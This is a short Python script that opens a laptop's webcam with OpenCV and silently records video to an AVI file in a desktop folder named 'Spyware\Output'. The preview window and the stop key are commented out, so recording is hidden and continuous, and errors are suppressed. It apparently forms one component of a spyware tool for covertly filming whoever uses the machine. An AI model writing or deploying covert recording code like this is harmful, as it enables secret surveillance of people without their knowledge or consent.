#!/usr/bin/env python
import cv2
import winshell

"""
This script accesses the Laptop's webcam using cv2 library and and starts recording a video without audio and saves 
the video when the script terminates to an avi file.
"""
def start():
    try:
        cap = cv2.VideoCapture(0)

        # Define the codec and create VideoWriter object
        dest_path = winshell.desktop() + r"\Spyware\Output"
        dest_path = dest_path.replace('\\','/') + "/outputvideo.avi"

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(dest_path,fourcc, 20.0, (640,480))

        while(cap.isOpened()):
            ret, frame = cap.read()
            if ret==True:
                out.write(frame)
            #   cv2.imshow('frame',frame) # show the camera in a window
            #if cv2.waitKey(1) & 0xFF == ord('q'):
            #    break
        # Release everything if job is finished
        cap.release()
        out.release()
        cv2.destroyAllWindows()
    except Exception:
        print("Failed")
